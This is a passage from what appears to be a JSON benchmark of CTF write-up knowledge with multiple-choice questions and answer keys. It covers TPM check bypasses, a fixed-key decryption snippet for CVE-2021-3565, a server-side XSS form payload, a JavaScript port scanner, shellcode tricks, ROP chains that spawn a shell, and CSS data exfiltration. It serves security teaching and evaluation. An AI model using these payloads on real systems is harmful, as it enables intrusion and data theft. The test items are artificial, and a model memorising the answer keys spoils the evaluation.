            "When dealing with encrypted data using TPM (Trusted Platform Module) and running into issues with software dependencies or inability to directly interact with the TPM due to connection issues (e.g., wrong or missing ports), it's possible to work around by modifying the source code of the TPM interaction library to bypass connection checks. In scenarios where a TPM tool refuses to work because it cannot connect to the required port, modifying the source code to return success early in the connection logic might allow further interaction with the TPM. For example, adding `return TSS2_RC_SUCCESS;` at the start of the troublesome function. This approach allows continuation of work with the expectation that the bypassed functionality is not critical for the intended operation.",
            "In the context of decrypting data encrypted with a TPM, if the decryption script requires a password that is unknown or appears to be complex, utilizing debugging tools (such as gdb for specific architecture, e.g., RISC-V64) can reveal the actual password check mechanism and the expected value directly in the memory. This can lead to either directly bypassing the password check by manipulating the program counter during debugging or extracting the actual password hash for use. If the extracted password is a hash or a form that is not directly usable, it might be provided to the decryption tool through command-line flags like `-passin file:passwordhash` in openssl command. This method requires access to the TPM's processing or password validation mechanism, typically available within its operational library's source code or through dynamic analysis during execution.\n\nExample payload or usage: `-passin file:passwordhash` in an openssl command, assuming `passwordhash` contains the binary password hash `7740ba0e627b5d6ba2a0acf0175981504350d9d9481963d1e0bba39ce6bc773c` extracted through debugging."
        ],
        "question": [
            "In a scenario where a developer is trying to use TPM-based decryption but faces an issue where the software cannot connect to the TPM's required port, which of the following modifications to the TPM interaction library's source code would likely allow the process to continue by bypassing the connection check? - A. Add `return TSS2_RC_FAILURE;` at the beginning of the connection logic. - B. Comment out the entire connection function's body. - C. Replace the connection logic with `return TSS2_RC_SUCCESS;` at the start of the function. - D. Delete the connection logic code entirely. ",
            "When attempting to decrypt data encrypted with a TPM and the decryption script demands a password that is either unknown or very complex, which approach can help in bypassing the password verification or extracting the actual password hash for usage? - A. Use a network packet analyzer to intercept the password during transmission. - B. Utilize a brute force attack to guess the password based on common patterns. - C. Modify the decryption script to eliminate the need for a password. - D. Apply debugging tools to directly manipulate the program counter during debugging or extract the actual password hash for usage. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Trusted Cloud 3",
        "write_up": "dataset/raw/Trusted Cloud 3.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When dealing with TPM and particularly the `TPM2_CC_Import` command in a CTF challenge, if you encounter encrypted data (e.g., a `duplicate` section that is the encrypted private part), and standard decryption methods fail to reveal meaningful information, consider exploring known vulnerabilities associated with the TPM version or specifications. In the context of CVE-2021-3565, the fix involved changing the encryption methodology for a key from a static value to a securely generated random number. This implies that before the fix, static or known keys were used, which could lead to a potential MITM attack vector by allowing the adversary to decrypt the imported key. This can lead to uncovering sensitive information by using the known static encryption key for decryption.\n\n   **Example Code for Decryption Using the Vulnerability:**\n   ```\n   from Crypto.Cipher import AES\n   # Using a fixed encryption key due to CVE-2021-3565\n   fixed_key = b'\\xFF'*32  # Fixed encryption key before the CVE-2021-3565 fix\n   iv_zero = b'\\0'*16  # Initialization vector is all zeros\n   cipher = AES.new(key=fixed_key, mode=AES.MODE_CFB, iv=iv_zero, segment_size=8*16)\n   decrypted_data = cipher.decrypt(bytes.fromhex('ENCRYPTED_HEX_DATA_HERE')).hex()\n   ```",
            "If an expected encryption or decryption operation within TPM does not behave as anticipated, potentially due to a security vulnerability or misinterpretation of the TPM commands and responses, reviewing the TPM's specification documents and examining existing tools (e.g., `tpm2-tools` repository for `tpm2_import`) could provide insights into the correct usage or known issues. Additionally, examining related security advisories can uncover specific vulnerabilities that could be exploited to achieve the challenge's objective, such as decrypting encrypted parts or understanding malformed or unexpected command behaviors.\n\n   **Context for Proper Use:** Before leveraging known cryptographic vulnerabilities like CVE-2021-3565 in similar scenarios, one should explore and understand the implications of such vulnerabilities on the affected cryptographic operations (e.g., key import procedures in TPM). This approach can be especially useful in scenarios where encrypted data does not decrypt as expected, suggesting the implementation may be susceptible to known issues or that specific exploitation techniques (like using known fixed keys) are necessary to proceed."
        ],
        "question": [
            "When attempting to decrypt data encrypted through the TPM2_CC_Import command and facing issues with the decryption process appearing ineffective, which of the following vulnerabilities should be considered, especially if the encryption method involved using static values before its disclosure?  - A. CVE-2019-5736, affecting the use of dynamic encryption keys. - B. CVE-2021-3565, involving the use of a fixed AES key for inner wrapper, revealing MITM attack vectors. - C. CVE-2018-12126, related to side-channel vulnerabilities in microarchitectural data sampling. - D. CVE-2020-0601, concerning cryptographic weakness in Windows CryptoAPI. ",
            "In a scenario where a decryption procedure within TPM does not yield the expected results, and standard diagnostic methods do not point towards a solution, which of the following steps is crucial for understanding and possibly overcoming the underlying issue?  - A. Consulting the TPM manufacturer's hardware documentation for potential hardware-based flaws. - B. Immediately reporting the problem to a security bulletin for widespread alert. - C. Reviewing TPM's specification documents and examining existing tools and security advisories related to TPM cryptographic operations. - D. Replacing the TPM module with a newer model to ensure compatibility with recent cryptographic standards. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "trusted shop",
        "write_up": "dataset/raw/trusted shop.md",
        "type": "web",
        "competition": [
            "KITCTFCTF/2023",
            "https://ctftime.org/event/1965/tasks/"
        ],
        "score": 714,
        "max_score": 1000,
        "difficulty": 0.714,
        "knowledge": [
            "To exploit a server-side XSS vulnerability within a PDF generation feature, one can insert malicious JavaScript in input fields that are reflected in the PDF. This JavaScript can perform actions such as port scanning or sending requests to internal endpoints. This approach leverages the server's PDF rendering process to bypass client-side restrictions like the same-origin policy.\n   \n   Example payload for form submission triggering the XSS:\n   ```html\n   <form name=\"myForm\" id=\"myForm\" action=\"http://127.0.0.1:[PORT]/\" method=\"POST\" enctype=\"text/plain\">\n        <input name='{\"variables\":{},\"' value='\":{},\"query\":\"query{findFirstItemOrThrow(where:{id:2}){download}}\"}' />\n   </form>\n\n   <script>\n      window.onload = function(){\n        document.forms['myForm'].submit();\n      }\n   </script>\n   ```",
            "For finding the correct port of an internally running service without direct access, JavaScript-based port scanning can be employed. This method uses differences in timing of failed image loads to determine if a port is open or closed. This technique can be effective for identifying the ports of internal services that are not directly exposed but can be communicated with from other exploited services.\n\n   Example approach for internal port scanning with JavaScript:\n   ```javascript\n   var portIsOpen = function(hostToScan, portToScan, N) {\n       // Function implementation details\n   }\n\n   document.body.innerHTML = \"Starting Port Scan...\";\n   async function test() {\n       for (var i = startPort; i < endPort; i++) {\n           let [isOpen, m, sumOpen, sumClosed] = await portIsOpen('localhost', i, 10);\n           if (isOpen) {\n               document.body.innerHTML += `\\nPort ${i} open\\n`;\n           }\n       }\n   }\n\n   test();\n   ```"
        ],
        "question": [
            "In a scenario where a PDF generation feature fails to sanitize user input, allowing execution of arbitrary JavaScript within generated PDFs, which of the following payloads would be executed by the server to exploit a server-side XSS vulnerability?  - A. `<script>alert(document.domain);</script>` - B. `<form action=\"http://example.com\" method=\"POST\"><input type=\"submit\"></form>` - C. `<img src=x onerror=alert(1)>` - D. `<form name=\"myForm\" id=\"myForm\" action=\"http://127.0.0.1:[PORT]/\" method=\"POST\" enctype=\"text/plain\"><input name='{\"variables\":{},\"' value='\":{},\"query\":\"query{findFirstItemOrThrow(where:{id:2}){download}}\"}' /></form><script>window.onload = function(){document.forms['myForm'].submit();}</script>` ",
            "When attempting to find the port number of an internal service in a web application vulnerability assessment, using a browser-based technique to differentiate between open and closed ports through timing analysis of image load failures, which of the below is a correct implementation of this technique?  - A. Using XMLHttpRequest to fetch a resource from various ports and checking the status code. - B. Creating an `<img>` element for each port, setting its `src` attribute to the target port, and measuring the time it takes for the `onerror` event to fire. - C. Making a series of `fetch` requests to different ports, timing how long it takes for the promises to reject. - D. var portIsOpen = function(hostToScan, portToScan, N) { /* Function implementation details omitted */ } document.body.innerHTML = \"Starting Port Scan...\"; async function test() { for (var i = startPort; i < endPort; i++) { let [isOpen, m, sumOpen, sumClosed] = await portIsOpen('localhost', i, 10); if (isOpen) {  document.body.innerHTML += `\\nPort ${i} open\\n`; } } } test(); "
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "trustworthy",
        "write_up": "dataset/raw/trustworthy.md",
        "type": "pwn",
        "competition": [
            "N1CTF/2018",
            "https://ctftime.org/event/584/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges related to Windows-based vulnerabilities, the exploitation can involve impersonating user processes to bypass security checks. This is particularly effective when the application checks the identity of a connected client by enumerating threads in the client process and uses the `AccessCheck` function against a specific security descriptor. In such scenarios, the Service-for-User (S4U) mechanism can be utilized to obtain an IdentificationLevel impersonation token, effectively bypassing the intended security measures.",
            "When dealing with Windows application security, especially in scenarios where file access permissions are involved, it is crucial to understand the role of thread and process tokens in access control. Windows uses Access Tokens to store the security context of a user account, which are then utilized by the operating system to perform access checks. If an application uses `AccessCheck` to validate access permissions against security descriptors (e.g., a file like `C:\\token.txt`), manipulating the token associated with a thread or process can be a viable attack vector. This approach may require deep understanding of Windows security mechanisms, including primary tokens and impersonation tokens."
        ],
        "question": [
            "In the context of a Windows-based application security challenge, if an attack involves bypassing security measures by impersonating user processes, which Windows mechanism can be effectively used to obtain an impersonation token with the desired access level? - A. Security Accounts Manager (SAM) - B. Local Security Authority Subsystem Service (LSASS) - C. Service-for-User (S4U) - D. Windows Access Control List (ACL)",
            "When attempting to manipulate access permissions against a security descriptor in Windows, such as `C:\\token.txt`, by leveraging an application's use of the `AccessCheck` function, which type of token manipulation is a viable attack vector? - A. Modifying the Local Security Policy - B. Changing the user's account type - C. Manipulating the token associated with a thread or process - D. Editing the registry keys related to user privileges"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "tudutudututu",
        "write_up": "dataset/raw/tudutudututu.md",
        "type": "reverse",
        "competition": [
            "nullconHackIM/2019",
            "https://ctftime.org/event/741/tasks/"
        ],
        "score": 495,
        "max_score": 500,
        "difficulty": 0.99,
        "knowledge": [
            "When dealing with alphanumeric shellcode constraints, such as in scenarios where the payload must only contain alphanumeric characters and a control over certain registers like `rax` is needed at runtime, utilizing small snippet injections (like `push r12; pop rax`) can effectively manipulate register values to prepare for the shellcode execution. This technique leverages the fact that pushing a register value onto the stack and immediately popping it into another register allows for the transfer of values between registers without using non-alphanumeric bytes. Additionally, understanding the precise memory layout and register state at the time of shellcode execution (e.g., ensuring `rax + padding_length == shellcode_address`) is crucial for the successful execution of such payloads.\n   - Example payload: `push r12; pop rax;`",
            "In challenges involving Use-After-Free (UAF) and double free vulnerabilities, especially with libc version 2.27 where tcache is implemented, poisoning the tcache list can allow an attacker to gain arbitrary code execution by allocating chunks over critical structures like `__free_hook`. This involves carefully orchestrated malloc and free calls to manipulate the tcache entry to point to a controlled location. Once `__free_hook` is overwritten with the address of a gadget or function like `system`, executing a free on a controlled chunk containing command strings such as \"/bin/sh\" can leverage the system call to spawn a shell.\n   - Due to the complexity and specificity of these attacks based on heap manipulation techniques and the libc version, generating a one-fit-all example payload here is not feasible. However, the concept revolves around:\n     1. Leaking libc addresses to bypass ASLR.\n     2. Crafting fake chunks or manipulating tcache to control `__free_hook`.\n     3. Overwriting `__free_hook` with the address of `system`.\n     4. Triggering the free of a chunk containing a command to execute."
        ],
        "question": [
            "In a security challenge where only alphanumeric shellcode is permitted and an allocated `RWX` page is used to execute arbitrary code, the instruction `push r12; pop rax` is prepended to the payload to manipulate register values for preparing the shellcode execution. Given the scenario that `rax` must be set near to the shellcode address for execution without directly modifying `rax` with non-alphanumeric characters, which of the following best describes the reason for using `push r12; pop rax` before the shellcode? - A. To decrement `rax` for aligning with the shellcode address. - B. To directly set the `rax` value to the shellcode address. - C. To indirectly manipulate `rax` by transferring `r12` value to it without using non-alphanumeric characters. - D. To increase the `rax` value beyond the shellcode address for execution. ",
            "In the context of CTF challenges emphasizing on exploiting Use-After-Free (UAF) and double free vulnerabilities, especially in applications using libc version 2.27 where the tcache mechanism is involved, understanding how to manipulate the tcache for arbitrary code execution is crucial. Considering the process of exploiting such vulnerabilities, what is the critical step after leaking libc addresses but before executing the final payload to gain unauthorized access or shell? - A. Overwriting `__free_hook` with the address of the `exit` function to safely terminate the program. - B. Poisoning the tcache list to allocate a chunk over `__free_hook` and rewrite it with the address of a benign function. - C. Filling up the tcache bins with dummy data to trigger an error condition and crash the application. - D. Manipulating the tcache list to point to `__free_hook` and overwrite it with the address of `system` to execute arbitrary commands. "
        ],
        "answer": [
            "C. To indirectly manipulate `rax` by transferring `r12` value to it without using non-alphanumeric characters.",
            "D. Manipulating the tcache list to point to `__free_hook` and overwrite it with the address of `system` to execute arbitrary commands."
        ]
    },
    {
        "name": "Turbo Blaise",
        "write_up": "dataset/raw/Turbo Blaise.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 443,
        "max_score": 497,
        "difficulty": 0.8913480885311871,
        "knowledge": [
            "When dealing with MS-DOS executables in reverse engineering challenges, particularly those that are obfuscated, closely examining assembly instructions for operations like comparisons and jumps can reveal important clues about input validation mechanisms. In scenarios where the executable is analyzing user input, such as password or command validation, instructions that compare stored or input values to a specific length or character set can often indicate how the input is being processed or validated. In this case, examining the assembly code helped identify how the password's length and content were being verified, leading to the discovery of password handling logic.",
            "For challenges involving obfuscated code where strings or passwords are verified or manipulated, using dynamic analysis techniques like setting breakpoints on critical instructions can help uncover the logic and values being compared or manipulated at runtime. Once the location and format of input data in memory are identified (e.g., Pascal strings in this MS-DOS challenge), manipulating the input to analyze changes in program behavior can further reveal the logic applied to the input data. This approach was key to identifying how buffers were xored together to check against a third buffer, ultimately revealing the mechanism to find the correct password. A practical application of this method involves using a debugger to dynamically examine and manipulate the memory and registers to track how input affects program flow.\n\nExample payload creation steps based on the challenge's context:\n- Identify buffers and their roles by setting breakpoints on comparison instructions.\n- Manipulate input values and observe changes in behavior or error messages to narrow down the correct format or length.\n- Use the identified logic (e.g., xoring buffers) to craft a payload that meets the validation requirements. In this scenario, the crafted payload was the correct password, `digital-modest-mentor`, discovered by xor-ing the identified buffers."
        ],
        "question": [
            "In the context of reversing a MS-DOS executable that checks the length of a user-provided password stored in a buffer at a specific memory address, which assembly instruction would be pivotal in understanding how the executable processes user input concerning the password's length? - A. ADD AX, BX - B. MOV AL, [0x1234] - C. CMP byte ptr [0xc02], 0x15 - D. XOR AL, AL ",
            "When analyzing an obfuscated program that compares a user-inputted password against a hidden criteria using xor operations on buffers, which technique is essential for revealing the relationship between the input and the program's validation logic? - A. Recompiling the executable with debug symbols - B. Using static analysis to find comments in the code - C. Setting breakpoints on key computational instructions and observing changes in memory - D. Redefining all variables in the high-level programming language "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "turtles",
        "write_up": "dataset/raw/turtles.md",
        "type": "pwn",
        "competition": [
            "CSAW/2018/Quals",
            "https://ctftime.org/event/633/tasks/"
        ],
        "score": 250,
        "max_score": 1285,
        "difficulty": 0.19455252918287938,
        "knowledge": [
            "In scenarios where the application allows writing arbitrary bytes to an object's memory location, it's possible to exploit Objective-C applications by overwriting the object's class pointers. This can lead to manipulating the message lookup mechanism (`objc_msg_lookup`) in Objective-C to redirect execution flow to an attacker-controlled area in memory, allowing for injection of malicious payloads. This method relies on understanding the memory layout of Objective-C objects and classes, specifically that the class pointer is stored at offset 0x00 of the instance, and the pointer to the implementation table is at offset 0x40 of the class object.",
            "For constructing successful ROP (Return-Oriented Programming) chains in exploitation scenarios, leaked addresses from the application (e.g., by using `printf` to leak a GOT entry) can be used to calculate the base address of libc. This allows an attacker to accurately predict the location of libc functions such as `system`, facilitating arbitrary code execution by calling system with a controlled string (e.g., \"/bin/sh\") to gain a shell. This technique typically involves a staged payload where the first stage leaks necessary addresses and the second stage executes the desired system call.\n\nStage 1 ROP-chain example:\n```py\nrop.raw(rop_rdi)  \nrop.raw(turtle + base_data)\nrop.raw(rop_rsi_r15)  \nrop.raw(setvbuf_got)  \nrop.raw(0)\nrop.raw(printf_plt)  \nrop.raw(main_addr)\n```\n\nStage 2 ROP-chain example:\n```py\nrop.raw(rop_rdi)  \nrop.raw(turtle + base_data)  \nrop.raw(libc.symbols[b\"system\"])\n```"
        ],
        "question": [
            "When exploiting an Objective-C application by overwriting an object's memory location, which of the following best describes the manipulation necessary to redirect execution flow? - A. Alter the instance's superclass pointer at offset 0x18 to point to an attacker-controlled memory area. - B. Change the method signature at runtime to bypass method lookup security checks. - C. Overwrite the class pointer at offset 0x00 and the implementation table pointer at offset 0x40 of the class object. - D. Modify the selector values at runtime to directly invoke unauthorized methods. ",
            "In a binary exploitation challenge, which approach best describes how to execute arbitrary code using leaked addresses to gain a shell? - A. Perform indirect jumps to randomized stack addresses hoping to hit the injected shellcode. - B. Use leaked addresses to overwrite stack return addresses directly with the address of the `/bin/sh` string. - C. Calculate the base address of libc using leaked addresses from the GOT, then build a ROP chain to call `system(\"/bin/sh\")`. - D. Encrypt the leaked addresses and send them back to the server to automatically exploit the binary's memory corruption vulnerability. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Twenty-five",
        "write_up": "dataset/raw/Twenty-five.md",
        "type": "crypto",
        "competition": [
            "Harekaze/2019",
            "https://ctftime.org/event/789/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "In challenges involving obfuscated code, especially when the obfuscation is done using a language's reserved words, one effective approach is to deobfuscate by replacing identified characters back to their original form based on a cipher key. This is particularly feasible when the obfuscation resembles a simple substitution cipher (monoalphabetic replacement). After identifying unique letter combinations and using a relevant word bank or list of reserved words for decryption, one can reconstruct the original code or message.  \n   Example approach: Use a word bank to match unique letter patterns in the obfuscated code, then systematically replace obfuscated characters with their original counterparts based on this analysis.",
            "In scenarios where a script (e.g., a Perl script) evaluates obfuscated text, modifying the script to firstly display rather than immediately execute the obfuscated code could provide insights into the obfuscation technique or reveal the cipher used. This step becomes a crucial preliminary analysis stage that allows for a safer and more controlled deobfuscation process without directly executing potentially harmful code.  \n   Example modification (to a Perl script for instance): Replace `eval($text);` with `print($text);`, enabling the researcher to view the obfuscated code first, thus identifying the obfuscation pattern or cipher before executing any code."
        ],
        "question": [
            "In the context of deciphering obfuscated Perl code resembling a simple substitution cipher, which method would effectively allow you to deobfuscate the code if you've identified unique letter combinations and have access to a word bank? - A. Perform a brute-force attack by trying all possible combinations of the cipher. - B. Use a word bank to match unique letter patterns in the obfuscated code, then systematically replace obfuscated characters with their original counterparts based on this analysis. - C. Increase the security settings of the Perl interpreter to prevent execution of obfuscated code. - D. Rewrite the obfuscated Perl code into another programming language to understand its logic. ",
            "In a scenario where a Perl script executes obfuscated code, why would modifying the script to print the obfuscated code (instead of executing it) be an important first step in safely deobfuscating and understanding the code? - A. Because it allows the obfuscated code to compile faster, speeding up the decryption process. - B. Printing the obfuscated code helps in identifying syntax errors that could be exploited. - C. It prevents the immediate execution of potentially harmful code, providing an opportunity to analyze the obfuscation technique or cipher first. - D. This modification increases the memory allocation for the Perl script, allowing for more complex obfuscation techniques to be used. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Twice As Secret, Right_ 922",
        "write_up": "dataset/raw/Twice As Secret, Right_ 922.md",
        "type": "crypto",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When encountering audio files in CTF challenges, one possible step is to analyze the file for morse code. This can be effectively accomplished using online Morse code decoders that can process audio files. These tools can translate the audio signals into alphanumeric characters if the audio contains Morse code signals.\n   - Example tool: https://morsecode.world/international/decoder/audio-decoder-adaptive.html",
            "If a straightforward translation of an intercepted message does not reveal a clear message or flag, consider the possibility of a cipher encoding. Specifically, for messages encoded on 5 characters (or any fixed length), the Bacon cipher is a potential method used for encoding. The length of the encoded message can provide a clue towards this cipher. Online tools can assist in decoding messages encrypted with the Bacon cipher.\n   - Example tool for decoding Bacon cipher: https://www.dcode.fr/bacon-cipher"
        ],
        "question": [
            "In a CTF challenge, you are given a .wav file suspected to contain encoded information. Which of the following methods is most appropriate for decoding the message if the audio file contains Morse code? - A. Convert the audio file to a text document and manually search for hints. - B. Use an online Morse code decoder that can process audio files, translating the audio signals into alphanumeric characters. - C. Directly play the audio file at different speeds trying to understand the Morse code by ear. - D. Use a standard music player to analyze the waveform for hidden text.",
            "Upon decoding an intercepted message from an audio file and realizing the translation doesn't make sense, you suspect a cipher might be at play. If the message is encoded on a 5-character basis without clear meaning, which cipher should be considered, and what tool could assist in this decryption? - A. Consider an AES encryption and use an AES decryptor tool. - B. Suggest it's a Vigen\u00e8re cipher and resort to a Vigen\u00e8re cipher decoder. - C. Hint towards it being a Caesar shift cipher and try a Caesar cipher decryption tool. - D. Recognize it could be a Bacon cipher, especially due to the fixed-length encoding, and use an online Bacon cipher decoder."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "twisty",
        "write_up": "dataset/raw/twisty.md",
        "type": "pwn",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 488,
        "max_score": 500,
        "difficulty": 0.976,
        "knowledge": [
            "When exploiting a stack-based buffer overflow in CTF challenges, it's crucial to identify how local variables are arranged on the stack. This knowledge allows for precise manipulation of variables, such as overwriting function return addresses or control variables, through crafted inputs that exceed the bounds of an intended buffer. For instance, overflowing a history buffer to manipulate an index variable that tracks the number of moves in a game. To facilitate this, understanding the size and layout of stack variables (e.g., `board`, `history`, `index`) in the target binary plays a critical role in crafting effective exploits.",
            "Leaking memory addresses to bypass ASLR (Address Space Layout Randomization) is another essential technique in modern exploitation, especially in CTF challenges. By carefully overwriting variables on the stack, such as an index that controls the display of a move history, attackers can force a program to reveal stack contents, including crucial addresses like the stack canary, base address, and `libc` address. This is achievable by manipulating the variable to read beyond its normal limit, turning it into an out-of-bounds read vulnerability. Once these addresses are leaked, they can be used to defeat ASLR, making it possible to execute a return-to-libc attack or other payload execution strategies effectively.\n\nSample payload for manipulating an index variable to leak memory addresses (simplified example, not directly from the write-up):\n```c\n// Assuming 'history' overflow to overwrite 'index' can lead to OOB read\nmemcpy(history + 2048, &new_index, sizeof(new_index)); // Overwrite 'index' variable to out-of-bounds value\n```"
        ],
        "question": [
            "In a puzzle-based game challenge, an attacker attempts to manipulate the game's behavior by overflowing a history array stored on the stack. The stack layout is depicted as follows, with variables sized and ordered sequentially: ``` uint8_t  board[0x10]; uint8_t  history[2048]; uint32_t index; ``` Given this stack arrangement, which of the following strategies would allow the attacker to overflow the `history` buffer and overwrite the `index` variable? - A. Sending exactly 2048 moves to fill the `history` buffer without overflow. - B. Sending undo commands to manipulate the `board` without affecting `history`. - C. Sending more than 4096 moves to overflow `history` and modify the `index` variable. - D. Modifying the `board` array directly to impact the `index`. ",
            "An attacker aims to bypass ASLR by leaking memory addresses in a challenge. The attacker has already overflowed a buffer, allowing them to manipulate an index variable that controls the display of move history in a game. The index manipulation leads to an out-of-bounds read, revealing stack contents. Which of the following attacks is the attacker most likely leveraging to defeat ASLR? - A. Heap spraying to guess the address of a required function in memory. - B. Manipulating the index variable to cause an out-of-bounds read, leaking addresses such as the stack canary, base address, and `libc` address. - C. Performing a brute-force attack to directly guess the `libc` address. - D. Using overflow to overwrite the `libc` address directly without leaking it first. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Two's Compliment",
        "write_up": "dataset/raw/Two's Compliment.md",
        "type": "reverse",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 250,
        "max_score": 550,
        "difficulty": 0.45454545454545453,
        "knowledge": [
            "In binary exploitation challenges where the shellcode execution environment prohibits certain byte values (e.g., only even-numbered bytes are allowed), strategies such as writing a preliminary shellcode to modify subsequent bytes in memory can enable the use of restricted operations or values. This approach involves using allowed instructions to increment memory content to the desired byte value, essentially encoding the final payload within constraints. \nExample payload part: `mov al, 8; inc BYTE PTR ds:[rax];` modifies a byte in memory to include an initially restricted value by incrementing an even byte.",
            "When dealing with shellcode restrictions, using tools like disassemblers (e.g., GDB, pwntools) to experiment and identify which instructions or byte sequences are allowable within the constraints can guide the development of a compliant exploit payload. This process involves iteratively testing instruction translations into bytecode to ensure they meet the challenge's requirements, and then crafting shellcode that leverages only the permitted byte values.\nExample instruction validation: \n- Allowed instruction `asm('inc BYTE PTR ds:[rax];')` resulting in bytecode `\\xfe\\x00` for incrementing memory content pointed by `rax`."
        ],
        "question": [
            "In a challenge where shellcode must consist of even-numbered bytes, which of the following instructions could be used to increment the value of a memory location pointed to by `rax` to eventually contain an odd-numbered byte, assuming `rax` contains a memory address initialized with an even-numbered byte? - A. `mov eax, 1; add BYTE PTR ds:[rax], eax;` - B. `add BYTE PTR ds:[rax], 1;` - C. `inc WORD PTR ds:[rax];` - D. `inc BYTE PTR ds:[rax];`",
            "Given a scenario where you are constrained to crafting shellcode with only even-numbered bytes due to restrictions imposed by a challenge, which tool and functionality would be most effective for confirming that your instruction to increment a byte in memory (e.g., `inc BYTE PTR ds:[rax];`) compiles to an even-numbered bytecode? - A. pwntools' `asm` function for translating assembly instructions to bytecode. - B. GDB's `disassemble` command to debug and inspect running processes. - C. A hex editor for manually adjusting byte values in precompiled shellcode. - D. Online disassembler tools for converting binary shellcode back to assembly."
        ],
        "answer": [
            "D",
            "A"
        ]
    },
    {
        "name": "Tyrannosaurus Rex",
        "write_up": "dataset/raw/Tyrannosaurus Rex.md",
        "type": "crypto",
        "competition": [
            "HacktivityCon/2020",
            "https://ctftime.org/event/1101/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "In a challenge involving reversing custom encryption schemes, if the encryption process involves base64 conversion followed by XOR operations, one can decrypt the message by applying the XOR operation in reverse order, considering base64 encoded known substrings to deduce the initial or ending state required for decryption. Specifically, if the flag format is known (e.g., `flag{.*}`), one can use the base64 representation of the known part (e.g., `base64.b64encode(b'flag')`) to start the reverse XOR process based on the encryption logic provided. \n   - Example approach for decryption (Python code snippet): \n   ```python\n   import base64\n   import binascii\n   \n   def decrypt(ciphertext):\n       z = list(binascii.unhexlify(ciphertext))\n       e = b''\n       # Assuming the first base64 character of 'flag' is known from the encryption scheme\n       last_char_value = base64.b64encode(b'flag')[0] \n       for i in range(len(z)-1, -1, -1):\n           last_char_value ^= z[i]\n           e = chr(last_char_value).encode('utf-8') + e\n       return base64.b64decode(e)\n   ```",
            "The XOR operation's reversible property, where `A ^ B = C` implies both `A ^ C = B` and `B ^ C = A`, can be exploited in cryptographic challenges to decrypt messages if part of the plaintext is known or predictable, such as standard flag formats. This is especially useful in scenarios where the encryption and decryption keys or methods are not directly given but can be inferred from the context or structure of encrypted data.\n   - Example payload cannot be defined universally due to variation in contexts; however, the principle is to identify a known value (e.g., part of the plaintext) and reverse engineer the encryption by sequentially applying XOR operations with known or deduced parts of the ciphertext or intermediate encryption states."
        ],
        "question": [
            "In the context of a certain cryptographic challenge, where the encryption process involves converting a flag to base 64 and then performing XOR operations between consecutive characters, which of the following Python code snippets correctly performs the decryption given the last character of the encrypted flag in base 64 format is known to correlate to the ASCII value 90? - A. ```python def decrypt(ciphertext): z = list(binascii.unhexlify(ciphertext)) e = b'' for i in range(len(z)): z[i] ^= 90 return e.join(map(chr, z)) ``` - B. ```python def decrypt(ciphertext): z = list(binascii.unhexlify(ciphertext)) e = b'' last = 90 for i in reversed(range(len(z))): last ^= z[i] e = chr(last).encode('utf-8') + e return base64.b64decode(e) ``` - C. ```python def decrypt(ciphertext): return base64.b64decode(ciphertext) ``` - D. ```python def decrypt(ciphertext): z = list(binascii.unhexlify(ciphertext)) return ''.join([chr(x) for x in z]) ```",
            "In decrypting an encoded message where the XOR operation has been used in a scenario as described, making use of the XOR operation's reversible property is crucial. Given an encryption that involves XORing consecutive characters and the known plaintext format `flag{.*}`, which principle is correctly applied to decrypt messages in such cryptographic challenges? - A. Using a brute-force approach to guess the encryption key. - B. Applying a known plaintext attack by exploiting the predictable format `flag{.*}` along with the base64 encoded equivalent of 'flag' to reverse the XOR operation. - C. Decrypting the message by XORing all characters with a fixed key derived from the ciphertext length. - D. Utilizing frequency analysis of English letters to deduce the plaintext without reversing the XOR process."
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "Ugliest Website",
        "write_up": "dataset/raw/Ugliest Website.md",
        "type": "pwn",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 474,
        "max_score": 500,
        "difficulty": 0.948,
        "knowledge": [
            "To exfiltrate data from a protected webpage where direct data extraction methods are blocked, consider employing CSS variables and keyframe animations. This approach uses CSS to construct conditional requests, where specific CSS properties (`background-image`, `border-image`, `list-style-image`) are loaded based on the presence of targeted substrings within the webpage's content. This method is useful in challenges that involve side-channel attacks via CSS to leak data based on conditional requests triggered by CSS selectors.\n   - Example payload snippet: \n     ```css\n     .sgn[value*=\"abc\"] { --p1: url(\"/path/to/trigger?abc\"); }\n     ```",
            "When dealing with browser limitations such as caching and frame dropping, optimize the exfiltration process by breaking down the secret into smaller segments (e.g., trigrams) and using several properties to request different images. This way, even if the browser caches the images or drops frames, the unique combination of these smaller segments can still reconstruct the secret. This technique is particularly effective for leaking data where the payload needs to bypass browser optimizations that could hinder the data exfiltration process.\n   - Example optimization: To prevent caching from interfering with data exfiltration, make each request unique by appending a query string, or by using different segments for each keyframe to ensure all required data is transmitted."
        ],
        "question": [
